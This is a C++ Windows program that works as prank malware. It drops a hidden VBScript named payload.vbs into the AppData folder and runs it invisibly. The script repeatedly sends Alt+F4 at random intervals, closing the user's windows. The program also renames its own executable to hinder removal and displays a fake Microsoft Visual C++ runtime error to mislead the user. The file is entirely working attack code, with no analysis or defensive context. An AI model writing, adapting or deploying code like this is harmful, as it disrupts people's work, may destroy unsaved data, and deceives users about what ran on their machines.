#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <fstream>
#include <cstdlib>

#pragma comment(lib, "shell32.lib")

std::string GetAppDataPath() {
    char path[MAX_PATH] = {0};
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
        return std::string(path);
    }
    const char* appdata = getenv("APPDATA");
    return appdata ? std::string(appdata) : std::string();
}

int main() {
    char exePath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string exeFullPath = exePath;
    
    std::string appData = GetAppDataPath();
    if (appData.empty()) {
        return 1;
    }
    std::string vbsPath = appData + "\\payload.vbs";

    
    {
        std::ofstream vbs(vbsPath.c_str());
        if (!vbs.is_open()) {
            return 1;
        }
        vbs << "Randomize\n";
        vbs << "Set shell = CreateObject(\"WScript.Shell\")\n";
        vbs << "count = Int((70 - 20 + 1) * Rnd + 20)\n";
        vbs << "For i = 1 To count\n";
        vbs << "    waitSec = Int((60 - 15 + 1) * Rnd + 15)\n";
        vbs << "    WScript.Sleep waitSec * 1000\n";
        vbs << "    shell.SendKeys \"%{F4}\"\n";
        vbs << "Next\n";
        vbs.close();
    }
    
    SetFileAttributesA(vbsPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    
    {
        std::string cmd = "wscript.exe \"" + vbsPath + "\"";
        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {0};
        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    
    std::string newPath = exeFullPath + " ";
    MoveFileA(exeFullPath.c_str(), newPath.c_str());
    
    std::string errorMsg;
    errorMsg += "Runtime Error!\n\n";
    errorMsg += "Program: " + exeFullPath + "\n\n";
    errorMsg += "This application has requested the Runtime to terminate it in an unusual way.\n";
    errorMsg += "Please contact the application's support team for more information.\n\n";
    errorMsg += "Error code: 0x80070002 - The system cannot find the file specified.";
    
    MessageBoxA(NULL,
                errorMsg.c_str(),
                "Microsoft Visual C++ Runtime Library",
                MB_OK | MB_ICONERROR);

    return 0;
}